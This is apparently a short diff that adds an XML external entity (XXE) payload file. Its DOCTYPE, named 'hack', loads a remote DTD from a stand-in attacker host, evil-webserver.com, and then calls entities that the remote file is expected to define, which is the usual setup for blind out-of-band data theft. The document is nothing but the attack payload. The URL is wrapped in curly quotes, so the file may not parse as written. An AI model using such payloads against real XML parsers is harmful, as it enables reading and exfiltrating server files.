@@ -1,0 +1,8 @@
+<?xml version="1.0" ?>
+<!DOCTYPE hack [
+<!ELEMENT x ANY >
+<!ENTITY % alpha SYSTEM “https://evil-webserver.com/payload.dtd”>
+%alpha;
+%bravo;
+]>
+<x>&charlie;</x>
